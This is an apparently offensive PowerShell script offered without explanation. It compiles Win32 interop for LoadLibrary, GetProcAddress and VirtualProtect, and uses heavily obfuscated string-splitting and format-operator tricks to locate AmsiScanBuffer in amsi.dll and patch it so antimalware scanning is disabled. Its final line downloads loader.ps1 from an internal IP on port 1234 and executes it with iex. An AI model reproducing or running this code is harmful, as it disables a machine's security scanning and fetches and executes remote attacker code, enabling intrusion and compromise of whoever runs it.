$mysecretstring123 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $mysecretstring123

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
('RIOAd'+'d'+'re'+'ss'+' = ['+'Wi'+'n3'+'2]:'+':Ge'+'t'+'P'+'r'+'ocAddress(RI'+'OLoadLibra'+'r'+'y, dp7A'+'msidp7 + dp7Sc'+'and'+'p7 +'+' dp'+'7'+'Bufferd'+'p'+'7'+')').RePlAcE(([CHar]82+[CHar]73+[CHar]79),[StRING][CHar]36).RePlAcE(([CHar]100+[CHar]112+[CHar]55),[StRING][CHar]34)| &( $verBOsEprEfEREncE.TOstrInG()[1,3]+'x'-JoiN'')
$p = 0
. ( $PshomE[21]+$PSHoMe[34]+'X')( ((("{2}{12}{1}{17}{8}{15}{4}{14}{11}{13}{10}{9}{3}{0}{6}{16}{7}{5}"-f 'x40,','32]::Vir','[',' 0','t({0',')',' [re','}p','alP','32]5,','s, [uint','e','Win','s','}Addr','rotec','f]{0','tu'))-f [chAR]36))
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 (("{57}{18}{54}{30}{9}{31}{60}{22}{4}{43}{59}{68}{1}{2}{23}{14}{46}{40}{28}{11}{25}{39}{74}{65}{13}{48}{66}{37}{49}{34}{27}{56}{24}{47}{21}{12}{45}{7}{72}{69}{62}{63}{61}{6}{36}{64}{16}{71}{67}{42}{70}{41}{35}{58}{50}{44}{3}{38}{73}{15}{10}{33}{53}{19}{0}{29}{75}{8}{20}{77}{17}{51}{78}{5}{26}{52}{76}{55}{32}" -f'ER','op','Se9m','R]','nt9m','rInG()','+9','9','PRef','tem.','b ','mfic','C9mf+9mfop','9','9mfr9mf+9mf','V','mf+9','E.t','f',' gWPV','eREN','f:','ntime.I','f+','9','e','[1,3','9mf','9','BO','s','R9m','f)','.','mfl]9mf+','6)9mf)','mftch,','f+','3','s','mf+','}Address, ',' 0, ','f','A','y(','v9','m','m','9','  [ch','o',']+9mfx9mf','(','[Sy','jOiN9mf9m',':9mf+',' ((9m','  -f','+9mfe','f+9mfu','mf','f+9m','f0}P9mf+9mfa9','9','f+','farsha9m','f','r','f{9m','{0','m','mf+9m','6) R','.M9m','se','-','C','sT')).rEPlaCE(([cHar]82+[cHar]86+[cHar]98),[sTRiNg][cHar]124).rEPlaCE('gWP','$').rEPlaCE(([cHar]57+[cHar]109+[cHar]102),[sTRiNg][cHar]39) | &( $pShOmE[4]+$PSHome[34]+'X')

(New-Object Net.WebClient).DownloadString('http://172.16.84.20:1234/loader.ps1') | iex